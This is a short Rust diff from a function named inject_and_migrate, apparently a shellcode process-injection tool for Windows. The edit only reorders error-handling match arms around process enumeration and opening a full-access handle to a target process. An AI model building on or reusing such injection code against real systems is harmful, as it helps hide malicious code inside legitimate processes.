@@ -29,8 +29,8 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
     let snapshot = unsafe { 
         match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) {
-            Err(_) => panic!("Could not obtain handle to snapshot"),
-            Ok(value) => value
+            Ok(value) => value,
+            Err(_) => panic!("Could not obtain handle to snapshot")
         }
     };
 
@@ -63,8 +63,8 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
     let explorer_handle = unsafe { 
         match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
-            Err(_) => panic!("Could not open a handle to the process"),
-            Ok(value) => value
+            Ok(value) => value,
+            Err(_) => panic!("Could not open a handle to the process")
         }
     };
 
